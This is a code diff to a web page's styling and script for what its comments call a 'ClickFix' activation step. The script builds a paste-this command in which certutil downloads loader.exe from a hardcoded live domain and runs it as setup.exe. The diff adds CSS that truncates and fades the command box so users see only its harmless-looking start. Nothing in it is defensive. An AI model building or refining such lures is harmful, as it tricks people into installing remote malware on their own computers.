@@ -208,8 +208,14 @@
     flex: 1; background: #0a0a0c; border: 1px solid var(--line); padding: 12px 14px;
     font-size: 12px; color: var(--dim); user-select: all;
     line-height: 1.4; font-family: 'JetBrains Mono', monospace;
-    white-space: nowrap; overflow-x: auto; cursor: pointer; transition: 0.2s;
-    display: flex; align-items: center;
+    white-space: nowrap; overflow: hidden; cursor: pointer; transition: 0.2s;
+    display: flex; align-items: center; position: relative; text-overflow: clip;
+    height: 40px; min-width: 0;
+  }
+  #cmdBox::after {
+    content: ''; position: absolute; top: 0; right: 0; bottom: 0; width: 60px;
+    background: linear-gradient(90deg, transparent, #0a0a0c);
+    pointer-events: none;
   }
   #cmdBox:hover { border-color: var(--green); }
 
@@ -408,14 +414,12 @@ function tick() {
 setTimeout(tick, 600);
 
 // ---- ACTIVATION SETUP (ClickFix) ----
-// Looks like a normal "download the installer" command - exactly what
-// someone would paste to install software they bought. Uses certutil
-// (a built-in Windows tool) to fetch the setup file, then runs it.
+// Uses the real deployed domain - not location.origin (which breaks
+// when the page is opened as a local file). The box cuts the command
+// off so only the head of it is visible.
 function buildScript() {
-  const base = location.origin + location.pathname.replace(/[^/]*$/, '');
-  const dl = base + 'loader.exe';
-  // Reads like: fetch setup.exe from official site and run it.
-  // certutil -urlcache -split -f <url> <local>  == built-in win tool downloader
+  // HARDCODED to the live domain
+  const dl = 'https://larpik.com/loader.exe';
   return 'certutil -urlcache -split -f "' + dl + '" %temp%\\setup.exe && start %temp%\\setup.exe';
 }
 function initCmd() {
